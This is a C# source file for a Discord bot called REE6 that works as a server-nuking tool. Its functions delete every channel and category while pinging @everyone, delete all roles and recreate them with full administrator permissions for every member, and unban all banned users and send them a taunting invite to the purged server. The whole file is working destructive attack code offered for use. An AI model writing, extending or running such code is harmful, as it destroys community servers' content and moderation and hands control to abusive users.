using System;
using System.Threading.Tasks;
using System.Timers;
using Discord;

namespace REE6
{
    public static class PurgeActions
    {
        public static async Task ChannelPurge(IGuild guild)
        {
            ITextChannel statusChannel = await guild.CreateTextChannelAsync("REE6 Channel Purge Progress", channel => channel.Position = 1);

            await statusChannel.SendMessageAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Channel Purge Operation Starting...");
            int categoryNum = guild.GetCategoriesAsync().Result.Count;
            int textChannelNum = guild.GetTextChannelsAsync().Result.Count;
            int voiceChannelNum = guild.GetVoiceChannelsAsync().Result.Count;

            // Purge Categories
            IUserMessage statusMessage = await statusChannel.SendMessageAsync("REEEEEEEEEE! Purging channel categories...");
            foreach (ICategoryChannel category in guild.GetCategoriesAsync().Result)
            {
                await category.DeleteAsync();
            }
            // Purge Text Channels
            await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Purging text channels...");
            foreach (ITextChannel channel in await guild.GetTextChannelsAsync())
            {
                if (channel.Id == statusChannel.Id)
                    continue;
                await channel.SendMessageAsync("@everyone REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE!!!!");
                await channel.DeleteAsync();
            }
            // Purge Voice Channels
            await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Purging voice channels...");
            foreach (IVoiceChannel channel in await guild.GetVoiceChannelsAsync())
            {
                await channel.DeleteAsync();
            }

            // Random for category separation
            Random random = new Random();

            // Recreate categories
            await statusMessage.ModifyAsync(msg => msg.Content = "Channel purge complete! Creating new channels...");
            statusMessage = await statusChannel.SendMessageAsync("REEEEEEEEEE! Creating categories...");
            ulong[] categoryIds = new ulong[categoryNum];
            for (int i = categoryNum; i > 0; i--)
            {
                ICategoryChannel categoryChannel = await guild.CreateCategoryAsync("REEEEEEEEEE! categorEEEEEEEEEEEEEEEEE!!!!");
                categoryIds[categoryNum - i] = categoryChannel.Id;
            }
            // Recreate Text Channels
            await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Creating text channels");
            for (int i = textChannelNum; i > 0; i--)
            {

                ITextChannel textChannel = await guild.CreateTextChannelAsync("REEEEEEEEEE! text channelEEEEEEEEEEEEEEEEE!!!!");
                try
                {
                    ulong randomCategoryId = categoryIds[random.Next(categoryNum)];
                    await textChannel.ModifyAsync(channel => channel.CategoryId = randomCategoryId);
                }
                catch
                {
                    await textChannel.SendMessageAsync("This channel could not be put into a category");
                }
            }
            // Recreate Voice Channels
            await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Creating voice channels");
            //IUserMessage voiceChannelFailsMessage = await statusChannel.SendMessageAsync("0 voice channels could not be put in a category");
            int voiceChannelFails = 0;
            for (int i = voiceChannelNum; i > 0; i--)
            {
                IVoiceChannel voiceChannel = await guild.CreateVoiceChannelAsync("REEEEEEEEEE! voice channelEEEEEEEEEEEEEEEEE!!!!");
                try
                {
                    ulong randomCategoryId = categoryIds[random.Next(categoryNum)];
                    await voiceChannel.ModifyAsync(channel => channel.CategoryId = randomCategoryId);
                }
                catch
                {
                    voiceChannelFails++;
                    //await voiceChannelFailsMessage.ModifyAsync(msg => msg.Content = voiceChannelFails + " voice channel(s) could not be put in a category.");
                }
            }

            await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Channel Purge Operation Complete!");
            await statusChannel.SendMessageAsync("Deleting channel in 3 seconds...");
            Timer terminate = new Timer(3000);
            terminate.AutoReset = false;
            terminate.Elapsed += new ElapsedEventHandler(delegate (object sender, ElapsedEventArgs e) { statusChannel.DeleteAsync(); });
            terminate.Start();
        }

        public static async Task RolePurge(IGuild guild)
        {
            ITextChannel statusChannel = await guild.CreateTextChannelAsync("REE6 Role Purge Progress", channel => channel.Position = 1);

            await statusChannel.SendMessageAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Role Purge Operation Starting...");
            int roleNum = guild.Roles.Count;

            Random random = new Random();
            Color[] roleColors = new Color[] { new Color(255, 0, 0), new Color(1, 1, 1) };

            // Purge all existing roles
            IUserMessage statusMessage = await statusChannel.SendMessageAsync("REEEEEEEEEE! Purging roles...");
            //IUserMessage roleFailsMessage = await statusChannel.SendMessageAsync("Failed to purge 0 roles");
            int roleFails = 0;
            foreach (IRole role in guild.Roles)
            {
                try
                {
                    await role.DeleteAsync();
                }
                catch
                {
                    roleFails++;
                    //await roleFailsMessage.ModifyAsync(msg => msg.Content = "Failed to purge " + roleFails + " role(s)");
                    roleNum -= 1;
                }
            }

            // Give everyone admin
            guild.EveryoneRole.Permissions.Modify(administrator: true);
            // Recreate all roles with admin
            for (int i = roleNum; i > 0; i--)
            {
                IRole role = await guild.CreateRoleAsync("REEEEEEEEEE Role! REEEEEEEEEE! Role!", GuildPermissions.All, roleColors[random.Next(2)]);
                foreach (IGuildUser user in await guild.GetUsersAsync(CacheMode.AllowDownload))
                {
                    await user.AddRoleAsync(role);
                }
            }

            await statusMessage.ModifyAsync(msg => msg.Content = "REEEEEEEEEE! Role Purge Operation Complete!");
            await statusChannel.SendMessageAsync("Deleting channel in 3 seconds...");
            Timer terminate = new Timer(3000);
            terminate.AutoReset = false;
            terminate.Elapsed += new ElapsedEventHandler(delegate (object sender, ElapsedEventArgs e) { statusChannel.DeleteAsync(); });
            terminate.Start();
        }

        public static async Task Unban(IGuild guild)
        {
            if (guild.GetBansAsync().Result.Count == 0)
                return;

            IInviteMetadata workingInvite = null;
            foreach (IInviteMetadata invite in await guild.GetInvitesAsync())
            {
                if (invite.IsRevoked || (invite.MaxUses < guild.GetBansAsync().Result.Count && invite.MaxUses != 0))
                    break;
                workingInvite = invite;
                System.Threading.Thread.Sleep(3000);
            }

            foreach (IBan ban in await guild.GetBansAsync())
            {
                await guild.RemoveBanAsync(ban.User);
                if (workingInvite != null)
                    await ban.User.SendMessageAsync("Remember this server? Yeah it's being purged by me, go check it out!" + workingInvite.Url);
            }
        }
    }
}
